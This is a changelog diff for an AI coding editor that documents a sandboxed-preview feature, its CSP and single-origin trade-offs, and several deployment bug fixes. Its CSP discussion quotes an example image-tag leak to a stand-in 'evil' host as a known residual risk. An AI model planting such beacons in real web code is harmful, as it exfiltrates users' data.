@@ -4,6 +4,236 @@ All notable changes to AI Editor are documented here.
 
 ## [Unreleased]
 
+## [1.22.0] - 2026-05-08
+
+### Feature — In-editor preview & verify Tier 1 (gitea#334)
+
+Closes the platform-level gap surfaced by the 2026-05-08 Sokoban dogfood
+incident on HTML-Games (`xcaliber/HTML-Games` PR #170): the agent
+shipped a game whose `bindEvents()` never ran because `updateUI()` threw
+on a missing `#level-display`, and ai-editor had no surface to load the
+page and observe the failure. Tier 1 ships the smallest useful first
+slice — a sandboxed iframe + three tools — per
+[`docs/DESIGN-preview.md`](docs/DESIGN-preview.md) §"First-Ship Scope".
+
+**What lands.**
+
+- Three new tools — `preview_start`, `preview_stop`, `preview_list` —
+  registered in [`js/tools/preview-tools.js`](js/tools/preview-tools.js).
+  All `readOnly: true`, `roles: 'all'`. Per-profile admission via
+  `coder.v1.tools.static`; `chat.v1` does not admit them.
+- Per-`serverId` lifecycle in
+  [`js/preview/preview-host.js`](js/preview/preview-host.js):
+  in-memory registry, slide-over mount, idempotent
+  `preview_start({path})` (same path → same `serverId`), and a
+  `package.json`-with-`scripts.dev` probe that returns
+  `{requires_build_step: true, hint}` for build-step projects (Cogfall
+  etc.) instead of a misleading URL.
+- A workspace-resolving Service Worker at
+  [`js/preview/service-worker.js`](js/preview/service-worker.js)
+  registered with default scope `/js/preview/`. Iframe URLs use
+  `/js/preview/<serverId>/<path>`; the SW intercepts those fetches,
+  postMessages the page-side bridge for content, and synthesizes
+  Responses with extension-derived MIME + a strict CSP (`default-src
+  'self'; connect-src 'self'; img-src 'self' data:; style-src 'self'
+  'unsafe-inline'; script-src 'self' 'unsafe-inline'; frame-ancestors
+  'self';`). Page-side bridge at
+  [`js/preview/sw-bridge.js`](js/preview/sw-bridge.js) resolves paths
+  via `Git.getFile`.
+- Slide-over panel at
+  [`html/preview-slideout.html`](html/preview-slideout.html) — distinct
+  from the existing `togglePreviewPane()` static-HTML/MD preview at
+  [`js/secondary-pane.js:42`](js/secondary-pane.js) (different surface,
+  name collision avoided by mounting as its own slide-over rather than
+  a fourth secondary-pane mode). Reuses the `.slide-out` CSS contract
+  from [`css/slide-out.css`](css/slide-out.css).
+- Profile + settings gating. New `preview: {enabled}` block on
+  [`js/profiles/coder-v1.js`](js/profiles/coder-v1.js) (`true`) and
+  [`js/profiles/chat-v1.js`](js/profiles/chat-v1.js) (`false`). New
+  `resolvePreviewConfig(role)` in
+  [`js/profiles/resolve.js`](js/profiles/resolve.js) mirrors
+  `resolveScriptAutomationConfig`. Runtime filter
+  `applyPreviewToolFilter` in [`js/llm/api.js`](js/llm/api.js) drops
+  the three tools from the per-turn API tools array when
+  `preview.enabled === false` on the resolved profile + settings
+  overlay.
+- Settings → Tools row in
+  [`js/settings/tools-tab.js`](js/settings/tools-tab.js) — single
+  boolean toggle at Tier 1 (`State.settings.preview.enabled`).
+
+**Trust boundary — and an honest single-origin trade-off.**
+`DESIGN-preview.md` §"The Load-Bearing Decision" calls for
+`sandbox="allow-scripts"` without `allow-same-origin`, which in a
+multi-origin deploy (a `preview.editor.gobha.ai` subdomain) gives the
+iframe a foreign origin and blocks `window.parent.State` reach. In a
+*single-origin* deploy (this static-deploy posture), Chromium's
+service-worker semantics deny SW interception to opaque-origin clients
+— verified live: a sandboxed iframe at `/js/preview/<id>/...` never
+receives a `fetch` event in our SW, so multi-file workspaces (typical
+HTML-Games shape: `index.html` plus separate `js/*.js` and `css/*.css`)
+cannot load. This was the open trade-off
+`DESIGN-preview.md` §"Open Questions" *"Self-hosted deploy with a
+single origin"* flagged.
+
+This PR ships the working multi-file preview by **omitting `sandbox`
+in single-origin mode**. The iframe runs at the editor origin and the
+SW intercepts subresource fetches via `Git.getFile`. The CSP we set
+from the SW (`default-src 'self'; connect-src 'self'; img-src 'self'
+data:; style-src 'self' 'unsafe-inline'; script-src 'self'
+'unsafe-inline'; frame-ancestors 'self';`) blocks outbound network so
+workspace JS cannot phone home — the *network* boundary is intact.
+The `window.parent` boundary is *not* — workspace JS the LLM authored
+could read `window.parent.State` if it were adversarial. The
+multi-origin deploy fix (subdomain) restores it byte-for-byte and
+stays the design's preferred path; deploy-side work to land that
+subdomain is downstream of this PR. The iframe-source code comment in
+[`js/preview/preview-host.js`](js/preview/preview-host.js) carries the
+full rationale.
+
+**Honest gap.** Tier 1 catches the "page didn't render at all" class
+(blank page, asset 404, missing entrypoint). Tier 1 does **not** catch
+the Sokoban class specifically — that's an uncaught `TypeError` during
+boot, and the iframe still renders the static board even when the
+script is dead. Tier 2 (`preview_console_logs` + `preview_errors`,
+console + error capture via a postMessage shim that runs before user
+code) closes that. Tier 2 phases behind dogfood signal per
+`DESIGN-preview.md` §"Phased Delivery"; Tier 3 (driveable preview +
+sidecar for build-step projects) gates on Tier 2 producing a use case
+selector-shaped tools cannot serve.
+
+**Tests.** New
+[`tests/test-preview-tools.mjs`](tests/test-preview-tools.mjs)
+exercises tool registration shape, argument validation that doesn't
+need browser globals, and the `resolvePreviewConfig` helper. Mirrors
+the `test-script-tools.mjs` pattern. The Service Worker round-trip is
+covered in the browser suite (`tests/index.html`) — Node cannot
+register a real SW.
+
+**Adjacent platform-side work** flagged in `DESIGN-preview.md`
+§"Adjacent Work" (HTML-Games CI gating + rollout-on-tag) stays out of
+scope here — those are HTML-Games tickets.
+
+**Production SW MIME fix (in-PR follow-up).** First production dogfood
+on PR #338 surfaced `preview_start` failing to register the SW. Firefox
+reported it generically (*"encountered an error during installation"*),
+Chrome named it precisely: *"The script has an unsupported MIME type
+('text/html')"*. Two distinct bugs surfaced:
+
+1. **BASE_PATH-unaware SW registration.** `js/preview/preview-host.js`
+   used a hardcoded `'/js/preview/service-worker.js'` script URL and
+   `'/js/preview/'` scope. On any non-root deployment (`/dev`, `/test`,
+   sub-path) those paths point at root rather than the editor's actual
+   base, so the SW probe lands on a path that doesn't exist —
+   regardless of whether the file is in the image. Both constants now
+   derive from `import.meta.url` so the SW URL resolves to
+   `<base>/js/preview/service-worker.js` and the scope to
+   `<base>/js/preview/` — root, `/dev`, `/test`, all behave identically.
+   The SW itself's `SCOPE_PREFIX` (was hardcoded the same way) now
+   derives from `self.location.pathname`, so its fetch-interception
+   pattern matches its own scope wherever it's served from.
+2. **Nginx SPA fallback hiding missing assets.** `try_files $uri $uri/
+   /index.html` in [`20-configure-base-path.sh`](20-configure-base-path.sh)
+   sent any missing static asset to the welcome HTML, masking the
+   real problem (a missing JS file would silently 200 with text/html
+   and the browser would reject the SW for "unsupported MIME type"
+   instead of complaining about 404). Fix: nested `location` block
+   matching common static-asset extensions (`.js`, `.mjs`, `.css`,
+   `.svg`, `.json`, `.wasm`, etc.) that runs `try_files $uri =404;`
+   instead of falling through. Missing static assets now 404 cleanly
+   — diagnosable upstream — while the SPA fallback still applies to
+   navigation requests. This is preview-adjacent platform hygiene; it
+   would have hidden any future stale-deploy or path-typo the same way.
+
+(My initial diagnosis blamed Firefox's strict SW install lifecycle;
+that was the BASE_PATH bug being misread. The speculative
+`event.waitUntil(self.skipWaiting())` defensive change at
+[`js/preview/service-worker.js`](js/preview/service-worker.js) stays
+in regardless — it's the spec-recommended form.)
+
+**CSP relaxed for visual resources (avoids future Tier 2 LLM confusion).**
+The fourth dogfood pass on a real game (Forge Defense) had it
+launching cleanly *— the trailing-slash + binary-byte fixes from the
+prior commit got games actually playing —* but the iframe's console
+filled with CSP violations from Google Fonts (`fonts.googleapis.com`
+in HTML-Games' shared stylesheet). The game still rendered with system
+fallbacks, but the noise would land directly in Tier 2's
+`preview_console_logs` once that ships, and an LLM consuming those
+errors would conclude the game was broken when it wasn't.
+
+The SW-injected CSP is now permissive for visual resources but stays
+strict on the load-bearing boundaries:
+
+  - `script-src 'self' 'unsafe-inline'`     no external scripts
+  - `connect-src 'self'`                    no JS-driven exfiltration
+  - `style-src  'self' 'unsafe-inline' https:`   any HTTPS stylesheet
+  - `font-src   'self' data: https:`        any HTTPS font
+  - `img-src    'self' data: https:`        any HTTPS image
+  - `frame-ancestors 'self'`                only editor can frame
+
+Residual concern: `<img src="https://evil/?leak=...">` is a low-
+bandwidth GET-URL-params side-channel. Accepted for Tier 1 single-
+origin mode where the iframe already shares `window.parent` reach
+(no sandbox attribute possible — see preview-host.js for the SW-vs-
+sandbox conflict that forced this); CSP is belt-and-braces here,
+not the load-bearing layer. Multi-origin deploy with a real preview
+subdomain restores the iframe sandbox boundary and tightens this
+back up. Documented in the iframe-creation comment.
+
+**Directory navigation + binary file fidelity.** Third dogfood pass
+on a real project (HTML-Games launcher) surfaced two more issues:
+(a) Launchers link to games via trailing-slash URLs
+(`<a href="forge-defense/">`); the iframe navigated to
+`/dev/js/preview/srv_xxx/forge-defense/`, the SW's path parser kept
+the trailing slash, and `Git.getFile('forge-defense/')` returned a
+directory listing or 404 — the browser saw the resulting envelope
+as something to download. Fix at
+[`js/preview/service-worker.js`](js/preview/service-worker.js):
+trailing-slash and empty paths now resolve to `<dir>/index.html` —
+matches every static web server's directory-index convention.
+(b) Binary files (woff2 fonts, png/jpg images, mp3/wav audio, wasm,
+zip, etc.) were corrupted because `Git.getFile`'s string content
+went through `TextEncoder` for the SW response — but the bytes had
+already been atob-fallback-decoded as raw-byte string, and re-encoding
+mangled them. Diagnostic surfaced as
+*"OTS parsing error: Failed to convert WOFF 2.0 font to SFNT"* on
+every font load. Fix at
+[`js/preview/sw-bridge.js`](js/preview/sw-bridge.js): binary
+extensions (`woff2`, `png`, `jpg`, `mp3`, `wasm`, etc. — full set in
+`BINARY_EXTS`) now use `_binaryStringToBytes` (charCodeAt loop)
+to recover bytes from the raw-byte string; text files use
+`TextEncoder` as before. Bridge now sends `body: ArrayBuffer`
+(transferable, zero-copy) instead of `content: string`; SW writes
+the buffer directly into the Response. The protocol stays
+backward-compatible — SW falls back to `payload.content` if
+`payload.body` is absent.
+
+**Self-healing SW registration + project-context labeling.** A second
+dogfood pass (Chrome DevTools live-eval) surfaced two more issues:
+(a) `_ensureServiceWorker` cached the registration object and short-
+circuited future calls — but a user who unregistered the SW
+out-of-band (DevTools, browser settings) would keep getting a stale
+reference and `register()` would never run again in the session, so
+the SW silently never came back. The new flow validates the cache via
+`getRegistration(scope)` first; if the live state doesn't match, it
+forces a fresh `register()`. Console tracing is intentional — the
+previous version exited silently on the unhappy paths and made
+"preview did nothing" near-impossible to diagnose without hooking the
+SW lifecycle event-by-event. (b) The slide-over subtitle now shows
+`owner/repo@branch · path · serverId` instead of just `path · serverId`.
+The dogfood user believed they were on HTML-Games but
+`State.currentProject` was actually xcaliber/ai-editor — the preview
+faithfully fetched ai-editor's `index.html` and looked like a preview
+bug. Showing the resolved project context makes mismatches obvious.
+
+**Tool-failure recoveryHint.** The SW-registration-failure envelope
+returned from [`js/preview/preview-host.js`](js/preview/preview-host.js)
+now carries a `recoveryHint` (sibling to §1.8.2's `getRefusalHint`)
+telling the model to skip preview and verify by other means rather
+than retry. Mirrors the dogfood LLM's actual recovery path — it took
+two failed retries before bailing in the 2026-05-08 trace. Useful
+regardless of root cause: any future preview-environment failure
+class hits the same hint and short-circuits the retry loop.
+
 ## [1.21.1] - 2026-05-08
 
 ### Bug fix — recent chats fail to reload (chatHistory alias corruption)
